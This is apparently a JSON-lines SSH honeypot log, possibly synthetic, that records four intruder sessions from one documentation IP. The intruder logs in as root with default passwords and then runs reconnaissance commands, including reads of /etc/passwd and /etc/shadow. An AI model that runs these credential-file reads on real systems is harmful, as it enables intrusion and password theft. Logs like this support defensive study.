+{"event": "command", "ts": "2026-10-19T23:44:31.260841+00:00", "session_id": "8e18efe6", "src_ip": "198.51.100.42", "command": "df -h", "seconds_since_prev": 8.1728, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T23:44:40.675540+00:00", "session_id": "8e18efe6", "src_ip": "198.51.100.42", "command": "cat /root/notes.txt", "seconds_since_prev": 9.4147, "backspaces": 2}
+{"event": "session_end", "ts": "2026-10-19T23:44:41.628176+00:00", "session_id": "8e18efe6", "src_ip": "198.51.100.42", "duration_s": 59.145, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-20T03:26:42.483536+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "src_port": 54341, "client_banner": "SSH-2.0-OpenSSH_9.3"}
+{"event": "auth_attempt", "ts": "2026-10-20T03:26:42.862524+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "username": "root", "password": "root", "accepted": true}
+{"event": "command", "ts": "2026-10-20T03:26:45.182572+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "command": "whoami", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T03:26:51.585338+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "command": "id", "seconds_since_prev": 6.4028, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T03:26:58.747997+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "command": "uname -a", "seconds_since_prev": 7.1627, "backspaces": 1}
+{"event": "command", "ts": "2026-10-20T03:27:10.601225+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "command": "ls -la", "seconds_since_prev": 11.8532, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T03:27:20.716009+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "command": "cat /etc/passwd", "seconds_since_prev": 10.1148, "backspaces": 2}
+{"event": "command", "ts": "2026-10-20T03:27:29.346545+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "command": "ps", "seconds_since_prev": 8.6305, "backspaces": 1}
+{"event": "command", "ts": "2026-10-20T03:27:34.905669+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "command": "df -h", "seconds_since_prev": 5.5591, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T03:27:39.386387+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "command": "cat /root/notes.txt", "seconds_since_prev": 4.4807, "backspaces": 2}
+{"event": "command", "ts": "2026-10-20T03:27:46.490240+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "command": "ls /home/deploy", "seconds_since_prev": 7.1039, "backspaces": 2}
+{"event": "command", "ts": "2026-10-20T03:27:59.762457+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "command": "cat /etc/shadow", "seconds_since_prev": 13.2722, "backspaces": 1}
+{"event": "command", "ts": "2026-10-20T03:28:02.704606+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "command": "netstat -tulpn", "seconds_since_prev": 2.9421, "backspaces": 3}
+{"event": "session_end", "ts": "2026-10-20T03:28:03.457404+00:00", "session_id": "77bf88f3", "src_ip": "198.51.100.42", "duration_s": 80.974, "command_count": 11, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-18T04:59:42.483536+00:00", "session_id": "bc654b07", "src_ip": "198.51.100.42", "src_port": 31215, "client_banner": "SSH-2.0-OpenSSH_9.3"}
+{"event": "auth_attempt", "ts": "2026-10-18T04:59:42.719732+00:00", "session_id": "bc654b07", "src_ip": "198.51.100.42", "username": "root", "password": "root", "accepted": true}
+{"event": "command", "ts": "2026-10-18T04:59:54.750023+00:00", "session_id": "bc654b07", "src_ip": "198.51.100.42", "command": "whoami", "seconds_since_prev": 0.0, "backspaces": 3}
+{"event": "command", "ts": "2026-10-18T04:59:59.851132+00:00", "session_id": "bc654b07", "src_ip": "198.51.100.42", "command": "id", "seconds_since_prev": 5.1011, "backspaces": 5}
+{"event": "command", "ts": "2026-10-18T05:00:11.705098+00:00", "session_id": "bc654b07", "src_ip": "198.51.100.42", "command": "uname -a", "seconds_since_prev": 11.854, "backspaces": 5}
+{"event": "command", "ts": "2026-10-18T05:00:20.279499+00:00", "session_id": "bc654b07", "src_ip": "198.51.100.42", "command": "ls -la", "seconds_since_prev": 8.5744, "backspaces": 5}
+{"event": "command", "ts": "2026-10-18T05:00:26.437225+00:00", "session_id": "bc654b07", "src_ip": "198.51.100.42", "command": "cat /etc/passwd", "seconds_since_prev": 6.1577, "backspaces": 5}
+{"event": "command", "ts": "2026-10-18T05:00:33.991845+00:00", "session_id": "bc654b07", "src_ip": "198.51.100.42", "command": "ps", "seconds_since_prev": 7.5546, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T05:00:45.607022+00:00", "session_id": "bc654b07", "src_ip": "198.51.100.42", "command": "df -h", "seconds_since_prev": 11.6152, "backspaces": 1}
+{"event": "command", "ts": "2026-10-18T05:00:47.565493+00:00", "session_id": "bc654b07", "src_ip": "198.51.100.42", "command": "cat /root/notes.txt", "seconds_since_prev": 1.9585, "backspaces": 2}
+{"event": "command", "ts": "2026-10-18T05:00:56.152582+00:00", "session_id": "bc654b07", "src_ip": "198.51.100.42", "command": "ls /home/deploy", "seconds_since_prev": 8.5871, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T05:01:06.116626+00:00", "session_id": "bc654b07", "src_ip": "198.51.100.42", "command": "cat /etc/shadow", "seconds_since_prev": 9.964, "backspaces": 5}
+{"event": "session_end", "ts": "2026-10-18T05:01:06.832269+00:00", "session_id": "bc654b07", "src_ip": "198.51.100.42", "duration_s": 84.349, "command_count": 10, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T06:02:42.483536+00:00", "session_id": "d911fad7", "src_ip": "198.51.100.42", "src_port": 55495, "client_banner": "SSH-2.0-OpenSSH_9.3"}
+{"event": "auth_attempt", "ts": "2026-10-17T06:02:42.724430+00:00", "session_id": "d911fad7", "src_ip": "198.51.100.42", "username": "root", "password": "P@ssw0rd", "accepted": true}
+{"event": "command", "ts": "2026-10-17T06:02:46.967516+00:00", "session_id": "d911fad7", "src_ip": "198.51.100.42", "command": "whoami", "seconds_since_prev": 0.0, "backspaces": 5}
+{"event": "command", "ts": "2026-10-17T06:02:50.318552+00:00", "session_id": "d911fad7", "src_ip": "198.51.100.42", "command": "id", "seconds_since_prev": 3.351, "backspaces": 1}
+{"event": "command", "ts": "2026-10-17T06:02:58.884224+00:00", "session_id": "d911fad7", "src_ip": "198.51.100.42", "command": "uname -a", "seconds_since_prev": 8.5657, "backspaces": 3}
+{"event": "command", "ts": "2026-10-17T06:03:01.623370+00:00", "session_id": "d911fad7", "src_ip": "198.51.100.42", "command": "ls -la", "seconds_since_prev": 2.7391, "backspaces": 5}
+{"event": "command", "ts": "2026-10-17T06:03:12.636403+00:00", "session_id": "d911fad7", "src_ip": "198.51.100.42", "command": "cat /etc/passwd", "seconds_since_prev": 11.013, "backspaces": 2}
+{"event": "command", "ts": "2026-10-17T06:03:25.415691+00:00", "session_id": "d911fad7", "src_ip": "198.51.100.42", "command": "ps", "seconds_since_prev": 12.7793, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T06:03:35.903656+00:00", "session_id": "d911fad7", "src_ip": "198.51.100.42", "command": "df -h", "seconds_since_prev": 10.488, "backspaces": 5}
+{"event": "command", "ts": "2026-10-17T06:03:43.005195+00:00", "session_id": "d911fad7", "src_ip": "198.51.100.42", "command": "cat /root/notes.txt", "seconds_since_prev": 7.1015, "backspaces": 5}
+{"event": "command", "ts": "2026-10-17T06:03:56.395316+00:00", "session_id": "d911fad7", "src_ip": "198.51.100.42", "command": "ls /home/deploy", "seconds_since_prev": 13.3901, "backspaces": 1}
+{"event": "command", "ts": "2026-10-17T06:03:59.252405+00:00", "session_id": "d911fad7", "src_ip": "198.51.100.42", "command": "cat /etc/shadow", "seconds_since_prev": 2.8571, "backspaces": 5}
+{"event": "session_end", "ts": "2026-10-17T06:03:59.546275+00:00", "session_id": "d911fad7", "src_ip": "198.51.100.42", "duration_s": 77.063, "command_count": 10, "auth_attempts": 1, "reason": "closed"}
